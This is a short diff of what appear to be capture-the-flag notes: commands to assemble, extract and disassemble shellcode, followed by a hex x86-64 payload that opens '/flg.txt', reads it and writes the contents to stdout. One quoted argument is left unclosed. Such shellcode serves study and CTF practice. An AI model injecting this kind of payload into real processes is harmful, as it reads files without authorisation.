@@ -1,0 +1,4 @@
+./assembler.sh flag.s
+python obtain_shellcode_from_bin.py flag
+pwn disasm '[shellcode in hex]' -c 'amd64
+4831ff5748bf2f666c672e74787457b0024889e74831f60f05488d374889c74831c0b2180f05b00140b701b2180f05
